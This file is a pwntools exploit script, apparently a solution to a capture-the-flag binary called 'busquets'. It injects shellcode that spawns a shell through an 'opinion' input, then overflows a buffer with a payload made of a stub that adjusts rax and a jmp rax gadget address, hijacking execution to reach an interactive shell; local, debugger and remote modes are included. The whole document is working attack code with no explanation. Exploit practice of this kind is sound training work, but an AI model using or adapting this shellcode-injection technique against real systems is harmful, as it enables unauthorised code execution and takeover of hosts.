from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:  
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './busquets'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT 
# ===========================================================

def addPlayer(name):
    p.sendline(b"1")
    p.sendline(name)

def addOpinion(index, opinion):
    p.sendline(b"2")
    p.sendline(str(index).encode())
    p.sendline(opinion)


p = start()

jmp_rax = p64(0x00000000004010fc)

shellcode_stub = asm(
    '''
    nop
    nop
    nop
    nop
    nop
    sub rax,0x200
    sub rax,0xcc
    jmp rax
    '''
    )

shellcode = asm(shellcraft.sh())
payload = shellcode_stub.ljust(20,b'a')
payload += jmp_rax


addPlayer("ZZZZZZZZ")
addOpinion(0,shellcode)
p.sendline("3")
p.sendline(payload)
p.interactive()
